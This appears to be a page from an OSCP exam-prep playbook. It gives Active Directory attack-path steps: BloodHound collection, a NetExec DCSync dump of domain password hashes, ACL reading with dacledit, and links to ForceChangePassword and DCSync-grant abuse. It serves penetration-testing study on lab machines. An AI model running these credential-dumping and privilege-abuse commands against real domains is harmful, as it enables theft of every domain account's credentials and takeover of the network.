# AD - BloodHound

**Step 45 of 50 · AD**

*Collect the directory graph and look for direct rights, group paths, and replication permissions.*

## Run this

> **Why:** This collects directory relationships and permissions so indirect paths such as delegated control or replication rights can be seen.
```bash
cd $BoxDir/loot
bloodhound-python -d $Domain -u $Username -p $Password -ns $BoxIP -c All --zip
cd $BoxDir
```

## Example output

```

INFO: Found 1 domains
INFO: Found 1 computers
INFO: Found 7 users
INFO: Compressing output into ...zip
```
Before loading the GUI, test DCSync directly — if it works, BloodHound analysis is optional:

> **Why:** This collects directory relationships and permissions so indirect paths such as delegated control or replication rights can be seen.
```bash
netexec smb $BoxIP -u $Username -p $Password -d $Domain --ntds 2>&1 | head -5
```

## What did you get?

- [ ] NetExec `--ntds` succeeds immediately → **The account has direct replication rights — go straight to Step 48 · [[AD - DCSync Dump]]**
- [ ] The current account has direct replication rights (BloodHound) → **Go to Step 48 · [[AD - DCSync Dump]]**
- [ ] Account Operators leads to a delegated group → **Go to Step 46 · [[AD - Account Operators Abuse]]**
- [ ] A user has `ForceChangePassword` over another account → **Go to Step 45A · [[AD - ForceChangePassword]]**
- [ ] A writable ACL path is shown → **Go to Step 47 · [[AD - DCSync Grant]]**
- [ ] No useful path is shown → **Go to Step 44 · [[AD - Local Credential Search]], run its registry checks, then return to Step 40 · [[AD - Credential Validation]] with any candidate credential**

## Notes

Look at the domain object and search for `DS-Replication-Get-Changes-All`. Always try the direct DCSync test first — it saves loading and importing the full BloodHound dataset when the path is already clear.

## Gotcha

> [!warning] 💡
> A BloodHound collection can succeed even when the GUI is unavailable. The collected data is still useful, and a direct DCSync test can confirm the important path.

## Direct ACL fallback

If the BloodHound GUI is unavailable, read the target object's access control entries directly.

> **Why:** This reads the target object’s ACL so the specific delegated permission can be confirmed before changing anything.
```bash
dacledit.py -action read -target $Username2 -u $Username -p $Password -d $Domain -dc-ip $BoxIP
```

Look for permissions such as `ForceChangePassword`, then validate the resulting credential before continuing.
## Seen in
- [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] -- AD technique reference

## Related stages

- [[AD - Service Scan]]
- [[AD - Credential Validation]]
- [[AD - BloodHound]]

## External Resources

- https://book.hacktricks.wiki/en/generic-methodologies-and-resources/index.html
- https://www.revshells.com/
## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
